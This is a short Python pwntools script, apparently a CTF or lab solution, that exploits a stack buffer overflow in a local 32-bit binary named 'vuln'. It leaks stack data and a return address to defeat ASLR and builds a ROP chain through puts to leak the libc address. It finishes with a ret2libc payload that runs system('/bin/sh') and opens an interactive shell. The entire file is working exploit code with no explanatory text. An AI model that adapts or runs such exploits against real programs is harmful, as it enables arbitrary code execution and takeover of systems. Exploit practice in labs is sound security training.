#!/usr/bin/python3
from pwn import *
import sys

exe = sys.argv[1] if len(sys.argv) > 1 else './vuln'
ret_to_main = 104 if 'vuln-cet' in exe else 100
context.arch = 'i386'
context.os = 'linux'

p = process(exe)

elf = p.elf
main_offset = elf.sym['main']
libc = elf.libc

p_leak = b'A' * (0x20 + 1)

p.recv()
p.send(p_leak)
recvdata = p.recv()
stackdata = recvdata.split(b'\n')[0].split(b'A'*(0x20+1))[1][:15].rjust(16, b'\x00')
main = u32(recvdata.split(b'\n')[0].split(b'A'*(0x20+1))[1][15:19])
elf.address = main - main_offset - ret_to_main
print(f'base address: {hex(elf.address)}')

rop = ROP(elf)
rop.raw(
    b'A' * 0x20 + stackdata +
    p32(elf.plt['puts']) +
    p32(elf.sym['task']) +
    p32(elf.got['puts'])
)

p.send(rop.chain())

p.recv()
p.send(b'A')

p.recv()
p.send(b'A')

realputs = u32(p.recv(4))
libc.address = realputs - libc.sym['puts']

p.recv()
p.send(p_leak)
recvdata = p.recv()
stackdata = recvdata.split(b'\n')[0].split(b'A'*(0x20+1))[1][:15].rjust(16, b'\x00')

payload = b'A' * 0x20 + stackdata + p32(libc.sym['system']) + b'A'*4 + p32(next(libc.search(b'/bin/sh\x00')))

p.send(payload)
p.recv()
p.send(b'A')

p.recv()
p.send(b'A')
p.interactive()
